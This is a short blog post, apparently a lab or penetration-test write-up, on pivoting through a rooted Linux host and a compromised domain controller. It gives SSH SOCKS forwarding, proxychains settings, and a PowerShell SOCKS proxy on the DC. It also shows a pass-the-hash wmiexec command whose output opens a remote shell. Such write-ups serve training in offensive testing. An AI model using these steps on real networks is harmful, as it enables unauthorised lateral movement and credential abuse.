---
layout: post
title:  "Pivoting In A Linux + Windows Env"
date:   2019-10-18 4:58:00 +0100
categories: PT pivoting
---

Scenario: I had rooted a linux box and used it to compromise other machines including a DC. And now I wanted to use that DC to go deeper into the network.

What I wanted to achieve:

```
+--------+     +-----+    +--+
|attacker+---->+Linux+--->+DC|
+--------+     +-----+    +--+
                          |
                          |
                          v
                        +--------------+
                        |Access to more|
                        |Things in the |
                        |Network       |
                        +--------------+
```

I was already pivoting on the Linux box, now I wanted to do the same on the DC.

## Pivoting on The Linux Box

### On Our Attacking Machine
I already had the private key for the root account, so I connected and setup dynamic port forwarding (setting up a socks proxy basically) over port 9000:

`ssh -i ~/.ssh/keys/key1 -D 9000 -Nf root@10.10.110.126`

modify /etc/proxychains.conf to include the linux box:

``` bash
[ProxyList]
### For Lab:
socks4 127.0.0.1 9000 
```

And thats it, now prefix any command you need to be proxied through the linux box with `proxychains`.

## Pivoting on The Windows Machine
I used the following powershell script to setup a socks proxy on the windows machine (DC): https://github.com/p3nt4/Invoke-SocksProxy

### On The DC:

Drop the script `Invoke-SocksProxy.psm1` from the repo on the windows machine. And run it.
In this scenario I ran the socks proxy on port 9000, note that I am a Domain Admin:

``` powershell
PS C:\users\humoud\Documents> Import-Module .\Invoke-SocksProxy.psm1
PS C:\users\humoud\Documents> Invoke-SocksProxy -bindPort 9000
Listening on port 9000...
New Connection from  172.16.1.221:36328
Threads Left: 199
New Connection from  172.16.1.221:36330
Threads Left: 199
New Connection from  172.16.1.221:36332
Threads Left: 198
New Connection from  172.16.1.221:36334
Threads Left: 197
```

### On Our Attacking Machine (Kali):
Now, we need to configure proxychains on our attacking machine.

modify /etc/proxychains.conf:

``` bash
[ProxyList]
### For Lab:
socks4 127.0.0.1 9000   # For the Linux Box, already there
socks4 172.16.1.2 9000  # Windows Box (DC1) <added this>
```

### Testing:
Time to test the setup, run a command prefixed with `proxychains`.
Here I ran wmiexec from Impacket, attempted to pass-the-hash and it succeeded:

```bash
> proxychains wmiexec.py -hashes :some_hash_here_:) administrator@172.16.2.3
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:9000-<>-172.16.1.2:9000-<><>-172.16.2.3:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:9000-<>-172.16.1.2:9000-<><>-172.16.2.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:9000-<>-172.16.1.2:9000-<><>-172.16.2.3:49666-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

